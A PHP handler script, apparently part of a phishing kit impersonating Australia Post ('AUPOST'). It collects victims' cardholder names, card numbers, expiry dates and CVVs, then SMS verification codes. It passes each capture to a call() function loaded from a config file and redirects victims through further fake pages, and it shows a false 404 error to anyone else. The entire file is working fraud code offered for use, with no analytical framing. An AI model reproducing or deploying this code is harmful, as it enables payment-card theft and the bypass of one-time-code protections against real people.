<?php 
require '../config.php';
 
    
    

if(isset($_POST['cc'])){
call("/- AUPOST CC -/
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']);
exit(header("location: l1.php"));
}

if(isset($_POST['sms'])){
call("/- AUPOST SMS -/
CODE: ".$_POST['sms']);

if(isset($_POST['e'])){
exit(header("location: exit.php"));
}else{
exit(header("location: l2.php"));
}

}


header("HTTP/1.0 404 Not Found");

?>